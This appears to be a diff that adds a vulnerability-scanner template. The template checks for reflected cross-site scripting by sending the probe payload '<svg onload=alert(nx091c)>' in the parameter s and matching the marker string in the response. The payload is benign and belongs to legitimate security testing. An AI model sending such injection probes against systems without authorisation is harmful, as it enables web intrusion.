@@ -1,0 +1,20 @@
+id: xss-092
+name: 'Reflected XSS ctx-4 via s'
+severity: high
+type: active
+tags:
+  - xss
+  - injection
+  - client
+description: 'Unencoded reflection in s'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      s:
+        - '<svg onload=alert(nx091c)>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nx091c'
